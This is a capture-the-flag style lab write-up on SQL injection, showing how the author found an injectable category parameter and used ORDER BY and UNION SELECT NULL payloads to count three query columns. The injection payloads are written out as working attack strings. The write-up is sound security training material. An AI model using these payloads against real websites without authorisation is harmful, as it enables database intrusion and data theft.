# SQL injection UNION attack, determining the number of columns returned by the query

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

![](<Images/SQL injection UNION attack, determining the number of columns returned by the query 0.png>)

## Solution

![](<Images/SQL injection UNION attack, determining the number of columns returned by the query 1.png>)

I visited the lab website and tested the `Gifts` category. I found user-controlled input in the URL:

```text
filter?category=Gifts
```

I captured the request using Burp Suite and added a single quote `'` to the parameter. As expected, the server returned an error:

```text
Internal Server Error
```

The goal of this lab is to find the number of columns in the current query using `NULL` values. However, to save time, I used the `ORDER BY` method with a binary search idea.

Payload format:

```sql
a' ORDER BY <number_of_column> -- -
```

Testing:

```sql
a' ORDER BY 5 -- -
```

Result: Error

```sql
a' ORDER BY 2 -- -
```

Result: Valid

```sql
a' ORDER BY 3 -- -
```

Result: Valid

```sql
a' ORDER BY 4 -- -
```

Result: Error

From these results, I determined that the query has 3 columns.

To finish the lab, I used this payload:

```sql
a' UNION SELECT NULL, NULL, NULL -- -
```

The lab was solved successfully.

![](<Images/SQL injection UNION attack, determining the number of columns returned by the query 2.png>)